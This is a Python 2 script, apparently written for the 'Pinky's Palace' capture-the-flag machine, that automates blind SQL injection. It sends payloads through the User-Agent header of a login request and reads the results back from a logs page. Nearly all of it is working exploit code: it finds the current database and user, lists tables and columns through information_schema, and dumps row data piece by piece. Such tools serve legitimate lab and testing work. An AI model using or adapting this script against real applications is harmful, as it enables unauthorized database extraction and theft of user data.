'''
@Author: Captain Darkshade

Twitter: @cdarkshade
YouTube: Captain Darkshade

Disclaimer: I am not a security professional nor do I consider myself as an expert. 
I am nothing more than a security enthusiast and a beginner at best. Scanning and 
attacking networks and computers without express permission is illegal in many countries. 
Code samples are provided as is and without warranty. All demos conducted in my own isolated lab.

'''
import requests
from termcolor import colored
from lxml import html

# collection to store data
information = {
    'tables' : [],
    'data' : []
}

# set target
target = 'http://pinkys-palace:8080/littlesecrets-main/'

# set proxies
proxies = {
    'http' : 'http://localhost:8080'
}

# set payloads 
payloads = [
    {
        'description' : 'Getting current database',
        'payload' : 'select database()',
        'tokens' : [],
        'key' : '+++current_database+++'
    },
    {
        'description' : 'Getting current db user ', 
        'payload' :"select user()",
        'key' : 'current_db_user',
        'tokens' : []
    },
    {
        'description' : 'Getting tables for current database', 
        'payload' : "select table_name from information_schema.tables where table_schema = '+++current_database+++' limit 1 offset +++offset+++" ,
        'key' : 'table',
        'tokens' : ['+++current_database+++', '+++offset+++']
    },
    {
        'description' : 'Getting columns from tables', 
        'payload' : "select column_name from information_schema.columns where table_schema = '+++current_database+++' and table_name = '+++table+++' limit 1 offset +++offset+++" ,
        'key' : 'column',
        'tokens' : ['+++current_database+++', '+++offset+++', '+++table+++']
    },
    {
        'description' : 'Exfiltrating Data', 
        'payload' : "select +++column+++ from +++table+++ limit 1 offset +++offset+++" ,
        'key' : 'data',
        'tokens' : ['+++offset+++', '+++table+++', '+++column+++']
    }
]

# iterate payloads
for payload in payloads:
    print colored("[i] ", "blue") + payload['description']
    index = 1 # track our substring location
    offset = 0 # track our offset in the injection
    tableoffset = 0 # track which table 
    columnoffset = 0 # track which column
    logvalue = 2 # track if we find log data to blanks in a row mean move on
    info = '' # our collected data
    
    while logvalue > 0:
        if payload['key'] == 'data'and columnoffset == 0 and offset == 0 and index == 1:
            try:
                exfil = raw_input('Exfil data for table %s [Y/n]: ' % information['tables'][tableoffset].keys()[0])
                if exfil == 'N' or exfil == 'n':
                    tableoffset += 1
                    continue
            except: # run out of tables to exfil
                logvalue = 0
                continue
        injection = "1'*conv(hex(substring((%s),%d,6)),16,10)*'1" % (payload['payload'],index) # base injection 
        for token in payload['tokens']: # replace tokens with extracted data and place holders
                if token == '+++offset+++': # controls which row we query
                    injection = injection.replace(token, str(offset))
                elif token == '+++table+++': # replace table token with exfiltrated table name
                    try:
                        injection = injection.replace(token, information['tables'][tableoffset].keys()[0])
                        if offset == 0 and payload['key'] == 'table':
                            print colored("[i] ", "blue") + "Enumerating table: " + information['tables'][tableoffset].keys()[0]
                    except: # no more tables to enumberate reset and move to the next payload
                        index = 1
                        offset = 0
                        logvalue = 0
                        tableoffset = 0
                        continue
                elif token == '+++column+++':
                    try:
                        injection = injection.replace(token, information['tables'][tableoffset][information['tables'][tableoffset].keys()[0]]['columns'][columnoffset])
                    except:
                        index = 1
                        columnoffset = 0
                        tableoffset += 1
                        continue
                else:
                    injection = injection.replace(token, information[token])
        # print injection
        # set up our header
        headers = {
            'User-Agent' : injection
        }
        # login data
        data = {
            'user' : 'pinky',
            'pass' : 'pinky'
        }
        # post our injection payload
        r = requests.post(target + 'login.php', headers=headers, proxies=proxies,data=data)
        # get the log content 
        r = requests.get(target + 'logs.php', proxies=proxies)
        if r.status_code >= 200 and r.status_code < 300:
            # get h4s
            page = html.fromstring(r.content)
            entries = page.xpath('//h4/text()')
            decimal = entries[-1].split(' ')[3]
            if len(decimal) > 0: # we have data to convert
                chunk = hex(int(decimal)).split('x')[1].decode("hex")
                info += chunk
                index += 6 # get the next 6 characters 
                logvalue = 2
            else:
                logvalue -= 1 # decrement our logvalue counter
                if len(info) > 0:
                    logvalue = 2 # reset our logvalue counter since we have data
                    if payload['key'] == 'data':
                        print colored("[$] ", "green") + information['tables'][tableoffset][information['tables'][tableoffset].keys()[0]]['columns'][columnoffset] + " : " + info
                    else:
                        print colored("[$] ", "green") + payload['key'] + " " + info
                    if payload['key'] == 'table': # push tables into our table collection
                        table = {}
                        table[info] = {'columns' : []}
                        information['tables'].append(table)
                    elif payload['key'] == 'column': # push column into table collection of columns
                        information['tables'][tableoffset][information['tables'][tableoffset].keys()[0]]['columns'].append(info)
                    elif payload['key'] == 'data': # push data into our data collection
                        information['data'].append(info)
                    else:
                        information[payload['key']] = info
                    info = '' # clear out temp info now that it has been stored

                if payload['key'] == 'data':
                    columnoffset += 1
                    index = 1
                    if columnoffset >= len(information['tables'][tableoffset][information['tables'][tableoffset].keys()[0]]['columns']):
                        index = 1
                        columnoffset = 0
                        logvalue = 1
                        offset += 1
                
                elif '+++offset+++' in payload['tokens']:
                    if logvalue == 1:
                        offset += 1 # increment offset
                        index = 1
                    elif logvalue == 0 and '+++table+++' in payload['tokens']: # move to the next table
                        index = 1
                        offset = 0
                        tableoffset += 1
                        logvalue = 2 
                else:
                    logvalue = 0 # cause exit of while loop


print information
